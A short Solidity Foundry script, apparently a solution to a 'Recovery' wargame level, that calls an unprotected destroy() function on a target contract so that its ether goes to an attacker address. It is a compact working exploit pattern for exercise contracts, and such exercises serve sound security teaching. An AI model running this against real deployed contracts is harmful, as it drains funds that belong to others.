// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script, console} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IRecovery {
    function destroy(address _to) external;
}

contract RecoveryAttacker is Constants, Script {
    function run() public {
        IRecovery victim = IRecovery(RECOVERY_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        attack(victim);
        vm.stopBroadcast();
    }

    function attack(IRecovery victim) private {
        victim.destroy(payable(ATTACKER_ADDRESS));
    }
}